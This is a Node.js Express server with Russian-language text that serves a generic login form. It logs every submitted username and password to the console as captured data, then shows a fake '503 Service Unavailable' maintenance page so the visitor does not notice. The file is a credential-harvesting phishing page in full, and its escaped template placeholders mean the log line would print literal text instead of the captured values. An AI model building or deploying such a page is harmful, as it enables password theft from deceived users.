const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

// Сервер будет отдавать форму прямо по главной ссылке
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вход в систему</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-content: center; height: 100vh; background: #f0f2f5; margin: 0; padding-top: 10%; }
        .login-card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 300px; height: fit-content; }
        h2 { margin-bottom: 20px; text-align: center; color: #333; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; border: none; color: white; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
<div class="login-card">
    <h2>Авторизация</h2>
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Имя пользователя" required>
        <input type="password" name="password" placeholder="Пароль" required>
        <button type="submit">Войти</button>
    </form>
</div>
</body>
</html>
    `);
});

app.post('/login', (req, res) => {
    console.log(`[СЕРВЕР] Данные получены! Логин: \${req.body.username}, Пароль: \${req.body.password}`);
    
    res.status(503).send(`
        <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 15%; color: #333;">
            <h1 style="font-size: 40px; margin-bottom: 10px;">503 Service Unavailable</h1>
            <p style="font-size: 18px; color: #666;">Сервер временно недоступен. Ведутся технические работы.</p>
            <hr style="width: 200px; border: 0; border-top: 1px solid #ccc; margin: 20px auto;">
            <p style="font-size: 14px; color: #999;">Пожалуйста, повторите попытку позже.</p>
        </div>
    `);
});

app.listen(PORT, () => {
    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
});
